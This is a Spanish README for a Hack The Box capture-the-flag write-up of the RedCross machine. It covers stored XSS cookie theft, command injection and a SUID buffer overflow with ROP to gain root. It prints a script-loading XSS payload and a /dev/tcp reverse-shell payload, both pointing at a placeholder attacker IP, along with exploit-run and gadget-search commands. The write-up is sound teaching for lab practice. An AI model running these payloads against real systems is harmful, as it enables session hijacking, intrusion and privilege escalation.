# RedCross - Hack The Box

![Dificultad](https://img.shields.io/badge/Dificultad-Medium-yellow)
![SO](https://img.shields.io/badge/SO-Linux-blue)
![Técnicas](https://img.shields.io/badge/Técnicas-XSS%20%7C%20Command%20Injection%20%7C%20Buffer%20Overflow-red)

---

## Información de la máquina

- **Nombre:** RedCross
- **Plataforma:** Hack The Box
- **IP:** 10.10.10.113
- **SO:** Linux (Debian 10)
- **Dificultad:** Medium
- **Link HTB:** [RedCross machine](https://app.hackthebox.com/machines/RedCross)

---

## Resumen ejecutivo

La explotación de RedCross se desarrolla en **tres fases críticas**:

1. **XSS Stored** → Robo de cookies de administrador mediante inyección JavaScript en formulario de contacto
2. **Command Injection** → Ejecución remota de comandos vía endpoint de gestión de whitelist para obtener shell como `www-data`
3. **Buffer Overflow** → Explotación de binario SUID (`/opt/iptctl/iptctl`) usando técnicas ROP para escalada a root

---

## Contenido del directorio
```
RedCross/
├── README.md                    # Este archivo
├── RedCross.md                  # Guía completa paso a paso
├── Scripts/
│   └── exploit.py              # Script de explotación Buffer Overflow
│   └── pwned.js                # Dos variantes de script para extracción de cookies 
└── Imágenes/
    ├── web_*.png               # Capturas del proceso web
    └── burp_*.png              # Capturas de BurpSuite
```

---

## Técnicas y vulnerabilidades explotadas

### 1. **Stored XSS (Cross-Site Scripting)**
- **Ubicación:** Formulario de contacto en `intra.redcross.htb`
- **Payload:** `<script src=http://ATTACKER_IP/pwned.js></script>`
- **Impacto:** Exfiltración de cookies de sesión del administrador (PHPSESSID)

### 2. **Session Hijacking**
- **Método:** Reutilización de cookies robadas vía XSS
- **Acceso logrado:** Panel de administración en `admin.redcross.htb`

### 3. **Command Injection**
- **Ubicación:** Endpoint de gestión de whitelist de IPs
- **Payload:** `; bash -c "bash -i >&/dev/tcp/ATTACKER_IP/443 0>&1"`
- **Shell obtenida:** Usuario `www-data`

### 4. **Buffer Overflow + ROP (Return-Oriented Programming)**
- **Binario vulnerable:** `/opt/iptctl/iptctl` (SUID root)
- **Protecciones:**
  - ✅ **CANARY:** disabled
  - ✅ **PIE:** disabled
  - ❌ **NX:** enabled (requiere ROP)
- **Técnica:** Cadena ROP para invocar `setuid(0)` y `execvp("sh", NULL)`
- **Shell obtenida:** Usuario `root` (UID 0)

---

##  Uso del script de explotación

### Requisitos previos

**1. Configurar entorno virtual de Python:**

```bash
# Crear entorno virtual
python3 -m venv venv

# Activar entorno virtual
source venv/bin/activate  # Linux/Mac
# O en Windows:
venv\Scripts\activate

# Instalar pwntools
pip3 install pwntools
```

**2. Asegurar acceso a la máquina:**
- Tu IP debe estar en la whitelist del firewall (vía panel `admin.redcross.htb`)
- Tener acceso SSH a la máquina objetivo con un usuario creado

### Ejecución del exploit

**Paso 1: En la máquina objetivo**
```bash
# Iniciar listener con socat
socat TCP-LISTEN:9002 EXEC:"/opt/iptctl/iptctl -i"
```

**Paso 2: En tu máquina atacante**
```bash
# Activar entorno virtual (si no está activo)
source venv/bin/activate

# Ejecutar exploit
cd Scripts/
python3 exploit.py
```

**Resultado esperado:**
```
[*] Conectando al servicio socat...
[+] Conexión establecida
[*] Enviando payload ROP...
[+] ¡Shell obtenida como root!
[*] Switching to interactive mode
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Recursos y herramientas utilizadas

### Herramientas principales
- **Nmap** - Escaneo de puertos y servicios
- **Gobuster/Wfuzz** - Enumeración de directorios y subdominios
- **BurpSuite** - Interceptación y análisis de peticiones HTTP
- **GDB-PEDA** - Debugging y análisis de binarios
- **Ropper** - Búsqueda de gadgets ROP
- **Pwntools** - Framework de explotación

### Comandos clave para análisis del binario

```bash
# Verificar protecciones del binario
checksec iptctl

# Buscar gadgets ROP
ropper --file ./iptctl --search "pop rdi"
ropper --file ./iptctl --search "pop rsi"

# Obtener direcciones de funciones PLT
objdump -D iptctl | grep -E "(setuid|execvp)"

# Encontrar string "sh" en el binario
strings -a -t x iptctl | grep "^.*sh$"
```

---

## Conceptos aprendidos

### Seguridad Web
- Validación insuficiente de entrada en formularios
- Almacenamiento inseguro de cookies (flag `httponly` no configurado)
- Concatenación de comandos del sistema sin sanitización

### Explotación de binarios
- Arquitectura x86_64 y convención de llamada System V AMD64 ABI
- Bypass de protecciones modernas (NX, ASLR) mediante ROP
- Uso de PLT/GOT para evitar aleatorización de direcciones
- Análisis de código fuente C para identificar vulnerabilidades

### Escalada de privilegios
- Abuso de binarios SUID mal configurados
- Manipulación del flujo de ejecución mediante buffer overflow
- Explotación de funciones privilegiadas (`setuid`, `execvp`)

---

## Notas importantes

1. **Whitelist obligatoria:** Sin añadir tu IP a la whitelist, no podrás acceder a puertos internos (21, 1025, 9002)

2. **Transferencia del binario:** Usa `md5sum` para verificar integridad:
```bash
   # En origen
   md5sum /opt/iptctl/iptctl
   
   # En destino
   md5sum iptctl
```

3. **Entorno de pruebas:** Este exploit solo debe ejecutarse en entornos controlados (laboratorios, CTFs)

4. **Dependencias del script:**
   - Python 3.8+
   - Librería `pwntools`
   - Conexión de red con la máquina objetivo

---

## 🔗 Referencias y documentación relacionada

- [Buffer Overflow - Guía completa](../../../../Buffer%20Overflow/)
- [XSS (Cross-Site Scripting)](../../../../OWASP%20TOP%2010/XSS/)
- [Command Injection](../../../../OWASP%20TOP%2010/Command%20Injection/)
- [Escalada de privilegios Linux](../../../../Técnicas/Escalada%20de%20privilegios/)
- [GDB-PEDA - Instalación](../../../../Herramientas/GDB-PEDA/)

---

## Créditos

- **Máquina creada por:** Hack The Box
- **Writeup y scripts:** Documentación educativa con fines de aprendizaje
- **Inspiración:** Comunidad de s4vitar y HackTheBox

---

## Disclaimer legal

Este material tiene **fines exclusivamente educativos**. La explotación de sistemas sin autorización expresa es **ilegal**. Practica únicamente en:
- Laboratorios autorizados (HTB, VulnHub, PentesterLab)
- Máquinas virtuales propias
- Entornos de testing con permiso escrito

**No nos hacemos responsables del uso indebido de esta información.**
